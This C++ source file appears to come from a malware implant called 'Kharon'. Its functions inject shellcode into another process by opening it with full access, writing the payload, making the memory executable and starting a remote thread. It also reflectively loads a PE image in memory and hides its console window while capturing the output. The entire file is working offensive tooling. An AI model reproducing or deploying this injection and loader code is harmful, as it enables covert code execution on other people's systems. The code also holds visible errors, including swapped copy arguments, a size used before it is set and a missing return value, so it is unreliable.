#include <Kharon.h>

auto DECLFN Injection::Shellcode(
    _In_ ULONG ProcessID,
    _In_ PBYTE Buffer,
    _In_ UPTR  Size,
    _In_ PVOID Param
) -> BOOL {
    BOOL  Success = FALSE;

    switch ( this->Ctx.Sc.TechniqueID ) {
        case ScClassic: {
            PVOID  ScBase   = NULL;
            ULONG  TdID     = 0;
            HANDLE TdHandle = INVALID_HANDLE_VALUE;

            KhDbg("dbg");

            Success = this->Classic( 
                ProcessID, Buffer, Size, Param, &ScBase
            );

            KhDbg("dbg");

            if ( !Success ) return Success;

            KhDbg("dbg");
            KhDbg("dbg");
        }
        case ScStomp: {

        }
    }

    return Success;
}

auto DECLFN Injection::Classic(
    _In_  ULONG   ProcessID,
    _In_  PBYTE   Buffer,
    _In_  UPTR    Size,
    _In_  PVOID   Param,
    _Out_ PVOID*  Base
) -> BOOL {
    BOOL   Success    = FALSE;
    HANDLE PsHandle   = INVALID_HANDLE_VALUE; 
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    PVOID  TmpMem     = NULL;
    PVOID  BaseRet    = NULL;
    ULONG  OldProt    = 0;
    ULONG  BytesRead  = 0;
    ULONG  FullSize   = 0;

    if ( ProcessID != 0 ) {
        PsHandle = Self->Ps->Open( PROCESS_ALL_ACCESS, FALSE, ProcessID );
    }

    BaseRet = Self->Mm->Alloc( PsHandle, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( PsHandle != INVALID_HANDLE_VALUE ) {
        Success = Self->Mm->Write( PsHandle, BaseRet, Buffer, Size );
        if ( !Success ) goto _KH_END;
    } else {
        Mem::Copy( BaseRet, Buffer, Size );
    }

    Success = Self->Mm->Protect( PsHandle, BaseRet, Size, PAGE_EXECUTE_READ, &OldProt );
    if ( !Success ) goto _KH_END;

    Self->Td->Create( PsHandle, BaseRet, Param, 0, 0, 0 );
_KH_END:
    if ( !Success && BaseRet ) {
        Self->Mm->Free( PsHandle, BaseRet, Size, MEM_RELEASE );
    } else {
        *Base = BaseRet;
    }

    return Success;
}

// auto DECLFN Injection::Stomp(

// )

auto DECLFN Injection::Reflection(
    _In_ PBYTE  Buffer,
    _In_ ULONG  Size,
    _In_ PVOID  Param
) -> BOOL {
    PBYTE  ImgBase = NULL;
    ULONG  ImgSize = 0;
    UPTR   Delta   = 0;
    BOOL   IsDll   = FALSE;
    PWCH*  Argv    = NULL;
    INT    Argc    = 0;

    PULONG Reads     = { 0 };
    HWND   WinHandle = NULL;
    HANDLE BackupOut = INVALID_HANDLE_VALUE;
    HANDLE PipeRead  = INVALID_HANDLE_VALUE;
    HANDLE PipeWrite = INVALID_HANDLE_VALUE;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    PIMAGE_NT_HEADERS     Header = { 0 };
    PIMAGE_SECTION_HEADER SecHdr = { 0 };
    PIMAGE_DATA_DIRECTORY RelDir = { 0 };
    PIMAGE_DATA_DIRECTORY ImpDir = { 0 };

    Header = (PIMAGE_NT_HEADERS)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
    SecHdr = IMAGE_FIRST_SECTION( Header );
    RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    IsDll = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;

    KhDbg( "parsed pe" );
    KhDbg( "is %s", IsDll ? "DLL" : "EXE" );

    ImgBase = (PBYTE)Self->Mm->Alloc( 0, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    Delta = Header->OptionalHeader.ImageBase - U_PTR( ImgBase );
    Size  = Header->OptionalHeader.SizeOfImage;

    KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        Mem::Copy(
            ImgBase + SecHdr[i].PointerToRawData,
            Buffer  + SecHdr[i].VirtualAddress,
            U_PTR( Buffer  + SecHdr[i].SizeOfRawData )
        );
    }

    KhDbg( "sections copied" );

    Self->Usf->FixImp( ImgBase, ImpDir );
    Self->Usf->FixRel( ImgBase, Delta, RelDir );

    KhDbg( "fixed imports and relocations" );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;;
        ULONG    MemoryProtection = 0;
        ULONG    OldProtection    = 0;
		
		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			MemoryProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			MemoryProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			MemoryProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			MemoryProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READWRITE;

        if ( !( Self->Mm->Protect( NtCurrentProcess(), &SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
    }

    KhDbg( "fixed sections memory protections" );

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Self->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Self->Krnl32.AllocConsole();

        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
            Self->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    KhDbg( "starting execution of the pe" );

    if ( IsDll ) {
        BOOL ( *KDllMain )( PVOID, ULONG, PVOID ) = decltype( KDllMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
        KDllMain( ImgBase, DLL_PROCESS_ATTACH, NULL );
    } else {
        if ( Header->OptionalHeader.Subsystem == 2 ) {
            INT ( *KWinMain )( PVOID, UPTR, PVOID, INT ) = decltype( KWinMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
            KWinMain( ImgBase, Self->Session.Base.Start, Param, SW_HIDE );
        } else if ( Header->OptionalHeader.Subsystem == 3 ) {
            INT ( *KMain )( INT, PWCH* ) = decltype( KMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
            Argv = Self->Shell32.CommandLineToArgvW( W_PTR( Param ), &Argc );
            KMain( Argc, Argv );
        }
    }

    KhDbg( "reading bytes..." );

    this->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
    Self->Krnl32.ReadFile( PipeRead, this->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );

_KH_END:
    if ( ImgBase ) {
        Self->Mm->Free( NULL, ImgBase, Size, MEM_RELEASE );
    }

    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
}